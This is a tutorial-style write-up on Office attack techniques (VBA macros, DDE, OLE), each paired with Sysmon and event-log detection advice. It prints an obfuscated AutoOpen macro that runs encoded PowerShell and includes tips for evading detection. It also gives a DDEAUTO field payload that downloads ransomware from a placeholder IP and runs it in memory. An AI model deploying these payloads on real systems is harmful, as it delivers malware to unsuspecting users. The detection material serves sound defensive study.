## Microsoft office Attacks

Microsoft office is  a bundle of software that running under windows operating system (ex: Word, Excel,PowerPoint, etc.)

Microsoft integrate many techniques to facilities the job of the user, like VBA macros to automate tasks, Dynamic Data exchange "DDE" to exchange data between Microsoft process, and object linking & Embedding "OLE" which is successor for DDE, this technologies which were meant to be some thing to make the user tasks easier, were misused by hacker, just like any thing.



### VBA Macros

first I need to clarify a thing, there are 4 different languages that some kind related,

- VB6 "Visual Basic"
  - it's compiled language that produce executables 
- VBA "Visual Basic for Application"
  - it's like VB6 but runs under an application "Micorsoft Office, AutoCAD,SolidWorks"
  - it's not compiled
- VBS "Visual Basic Script"
  - used in Web to access do some manipulation on devices
  - need host to run under it which is WSH " windows script host"
  - Not compiled
- JScript
  - Like VBS but with different syntax
  - also run under  WSH

VBA,and VBS syntax are different but not huge difference
but Jscript has major difference in syntax compared to VBS/VBA



Now, lets go back to VBA macros which used in Microsoft office product

the following macro is a sample of malicious macro that used in word documents
it have a form called "skrfeev" that has 3 controls "lables" contains malicious code



**Label1** contains in the ControlTipText property "new:72c24dd5-d70a-438b-8a42-98424b88afb8"

72c24dd5-d70a-438b-8a42-98424b88afb8 is the CLSID for Wscript.shell, could be found in Registry under

Computer\HKEY_CLASSES_ROOT\Wscript.shell\CLSID in a value called "Default"

using CLSID with GetObject is better that ProgID with CreateObject to bypass some Detection techniques 

**Label2** contains in the ControlTipText property  "PoWeRSheLL -ENCOD"

**Label3** contains in the ControlTipText property  "Malicious Powershell code encoded in Base64"

```vb
Function Func1(Array, Array_index)
  Set Element = Array(Array_index)
  Func1 = (Element.ControlTipText) + ""
End Function

Function GetobJect_xx(ObjectID)
 Set GetobJect_xx = GetObject(ObjectID)
End Function

Sub AutoOpen()
Const_Int = Sqr(4) - 1
ObjectID = Func1(skrfeev.Controls, 1)
If Dummy_Var = 2 Then
  MsgBox ObjectID
End If
GetobJect_xx(ObjectID).Run% Func1(skrfeev.Controls, 2) + Func1(skrfeev.Controls, 0), 8552 - 4
End Sub


```



![Mermaid2](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/Mermaid2.JPG)



## Detection

We can't detect the running of macros, but we can detect the events that happened when file contains macro or file is trusted by user to run its macro

when user trust document or enable editing for it , there is values added to registry to let windows remember user's choice

Data of this value may vary upon the permission

- suffix FF FF FF 7F means enable macro
- suffix 01 00 00 00 means enable for writing

Macros enabling generate not event in office Alerts [Windows Events] "OAlertx.evtx"

**Detection** 

- sysmon

  - Registry edit for \Security\Trusted

  ```xml
  <Sysmon schemaversion="4.00">
  <HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
    <EventFiltering>
  		
  		<RegistryEvent default="include"> 
  			<TargetObject condition="contains">\Security\Trusted</TargetObject>
  		</RegistryEvent>
  		
  	
  	</EventFiltering>
  </Sysmon>
  ```
  
  

RegRipper which is very good tool for registry analysis has a plugin called trusterecords which display files trusted in Microsoft office

------

### Dynamic Data Exchange "DDE"

Dynamic Data exchange is a method that enable office application from getting data from another office application, it can run at startup which means that when word office opens it will run, it help users import data from file to file and do their tasks easily

#### Attack 

*it's not working on Win 10 1809 and above*

Open Word file and create formula



![DDE1](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/DDE1.png)



![DDE2](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/DDE2.png)



![DDE3](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/DDE3.png)

when you Toggle Field Codes remove = \\* MERGEFORMAT and place the following

```powershell
{DDEAUTO c:\\windows\\system32\\cmd.exe "/c powershell.exe -nop -ep bypass-C ( [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://[IP]/ransinvoke.exe')).EntryPoint.Invoke($Null,$Null))"}
```

this will download ransomware from external IP and load it directly in the memory *"the executable must be .net to be able to use this command line and must have no argument in the main function, if it has you have to edit the code in the command line with types of arguments"* 



### Detection

- Windows events
  - Micorsoft Office Alerts [OAlerts] "C:\Windows\System32\winevt\Logs\OAlerts.evtx"
    
    - EventID 300: it will show (c PowerShell) which is /c powershell.exe but it will not show any other details like command line of the PowerShell "we can get PowerShell command from PowerShell logging" but if cmd will run regsrv32 as example, we have no log
      also we don't have the name of the office file to examine it, but we can  look at recent folder for windows or recent folder for Microsoft word to obtain recently opened files
    
    

![DDEOAlert](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/DDEOAlert.jpg)

---



### Object linking & embedding "OLE"

Object linking and embedding is very awesome feature in office that makes you create objects in an application and copy it to another application(ex: objects like graphs, tables), it is the successor of DDE

to Create it 
Insert --> Object --> Package , Display ICON "choose ICON from WINWORD.exe" --> name the lable --> choose the file 



![OLE](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/OLE.JPG)



![OLE2](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/OLE2.JPG)

OLE suffered from buffer overflow vulnerabilities that let attacker use it to deliver malwares, the good thing for attackers in this case that when OLE runs their malicious command buried inside the document, there is no "Enable content" button that use have to click on neither popup like in DDE "**CVE-2017-11882**" not working in Win 10 1809 and above





### Detection

for OLE there is no Events and there is no registry key to search so I will talk about general detection



![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Microsoft office Attacks/Misc/Mermaid.JPG)



- **sysmon**
  - Process Create
    - Parent process in the office path "Microsoft Office\Office", it contains WINWORD.exe,EXCEL.exe .etc
```xml
<Sysmon schemaversion="4.00">
<HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <EventFiltering>
		
		<ProcessCreate default="include"> 
			<ParentImage condition="contains">Microsoft Office\Office</ParentImage>
		</ProcessCreate>
      
	</EventFiltering>
</Sysmon>
```



### Reference

- 1- [VBS tutorial](https://ss64.com/vb/)
- 2- [DDE Security from Micrsoft](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)
- 3- [office exploits](https://github.com/SecWiki/office-exploits)

  